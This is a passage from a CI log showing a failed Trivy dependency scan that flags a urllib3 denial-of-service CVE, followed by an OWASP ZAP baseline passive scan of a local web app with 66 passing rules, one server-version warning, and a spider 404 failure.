+│          │ CVE-2026-97689      │          │        │                   │                │ urllib3: urllib3: Denial of Service via unbounded memory     │
+│          │                     │          │        │                   │                │ allocation in chunk parser...                                │
+│          │                     │          │        │                   │                │ https://avd.aquasec.com/nvd/cve-2026-97689                   │
+└──────────┴─────────────────────┴──────────┴────────┴───────────────────┴────────────────┴──────────────────────────────────────────────────────────────┘
+===== job trivy-gate: failed (exit 1)
+
+===== job zap-baseline (stage dast, image zaproxy/zap-stable) =====
+The virtual environment was not created successfully because ensurepip is not
+available.  On Debian/Ubuntu systems, you need to install the python3-venv
+package using the following command.
+
+    apt install python3.11-venv
+
+You may need to use sudo with that command.  After installing the python3-venv
+package, recreate your virtual environment.
+
+Failing command: /tmp/venv/bin/python3
+
+Using the Automation Framework
+Total of 6 URLs
+PASS: Vulnerable JS Library (Powered by Retire.js) [10003]
+PASS: In Page Banner Information Leak [10009]
+PASS: Cookie No HttpOnly Flag [10010]
+PASS: Cookie Without Secure Flag [10011]
+PASS: Re-examine Cache-control Directives [10015]
+PASS: Cross-Domain JavaScript Source File Inclusion [10017]
+PASS: Content-Type Header Missing [10019]
+PASS: Anti-clickjacking Header [10020]
+PASS: X-Content-Type-Options Header Missing [10021]
+PASS: Information Disclosure - Debug Error Messages [10023]
+PASS: Information Disclosure - Sensitive Information in URL [10024]
+PASS: Information Disclosure - Sensitive Information in HTTP Referrer Header [10025]
+PASS: HTTP Parameter Override [10026]
+PASS: Information Disclosure - Suspicious Comments [10027]
+PASS: Off-site Redirect [10028]
+PASS: Cookie Poisoning [10029]
+PASS: User Controllable Charset [10030]
+PASS: User Controllable HTML Element Attribute (Potential XSS) [10031]
+PASS: Viewstate [10032]
+PASS: Directory Browsing [10033]
+PASS: Heartbleed OpenSSL Vulnerability (Indicative) [10034]
+PASS: Strict-Transport-Security Header [10035]
+PASS: Server Leaks Information via "X-Powered-By" HTTP Response Header Field(s) [10037]
+PASS: Content Security Policy (CSP) Header Not Set [10038]
+PASS: X-Backend-Server Header Information Leak [10039]
+PASS: Secure Pages Include Mixed Content [10040]
+PASS: HTTP to HTTPS Insecure Transition in Form Post [10041]
+PASS: HTTPS to HTTP Insecure Transition in Form Post [10042]
+PASS: User Controllable JavaScript Event (XSS) [10043]
+PASS: Big Redirect Detected (Potential Sensitive Information Leak) [10044]
+PASS: Retrieved from Cache [10050]
+PASS: X-ChromeLogger-Data (XCOLD) Header Information Leak [10052]
+PASS: Cookie without SameSite Attribute [10054]
+PASS: CSP [10055]
+PASS: X-Debug-Token Information Leak [10056]
+PASS: Username Hash Found [10057]
+PASS: X-AspNet-Version Response Header [10061]
+PASS: PII Disclosure [10062]
+PASS: Permissions Policy Header Not Set [10063]
+PASS: Timestamp Disclosure [10096]
+PASS: Hash Disclosure [10097]
+PASS: Cross-Domain Misconfiguration [10098]
+PASS: Source Code Disclosure [10099]
+PASS: Weak Authentication Method [10105]
+PASS: Reverse Tabnabbing [10108]
+PASS: Modern Web Application [10109]
+PASS: Dangerous JS Functions [10110]
+PASS: Authentication Request Identified [10111]
+PASS: Session Management Response Identified [10112]
+PASS: Verification Request Identified [10113]
+PASS: Script Served From Malicious Domain (polyfill) [10115]
+PASS: ZAP is Out of Date [10116]
+PASS: Absence of Anti-CSRF Tokens [10202]
+PASS: Private IP Disclosure [2]
+PASS: Server Side Technology Version with Known Vulnerabilities [20020]
+PASS: Session ID in URL Rewrite [3]
+PASS: Script Passive Scan Rules [50001]
+PASS: Stats Passive Scan Rule [50003]
+PASS: Insecure JSF ViewState [90001]
+PASS: Java Serialization Object [90002]
+PASS: Sub Resource Integrity Attribute Missing [90003]
+PASS: Insufficient Site Isolation Against Spectre Vulnerability [90004]
+PASS: Charset Mismatch [90011]
+PASS: Application Error Disclosure [90022]
+PASS: WSDL File Detection [90030]
+PASS: Loosely Scoped Cookie [90033]
+IGNORE: Non-Storable Content [10049] x 5 
+	http://127.0.0.1:5000/ (404 Not Found)
+	http://127.0.0.1:5000/api (404 Not Found)
+	http://127.0.0.1:5000/api/products (200 OK)
+	http://127.0.0.1:5000/robots.txt (404 Not Found)
+	http://127.0.0.1:5000/sitemap.xml (404 Not Found)
+WARN-NEW: Server Leaks Version Information via "Server" HTTP Response Header Field [10036] x 4 
+	http://127.0.0.1:5000/ (404 Not Found)
+	http://127.0.0.1:5000/api (404 Not Found)
+	http://127.0.0.1:5000/robots.txt (404 Not Found)
+	http://127.0.0.1:5000/sitemap.xml (404 Not Found)
+FAIL-NEW: 0	FAIL-INPROG: 0	WARN-NEW: 1	WARN-INPROG: 0	INFO: 0	IGNORE: 1	PASS: 66
+Automation plan warnings:
+	Job spider error accessing URL http://127.0.0.1:5000/ status code returned : 404 expected 200
+===== job zap-baseline: failed (exit 2)
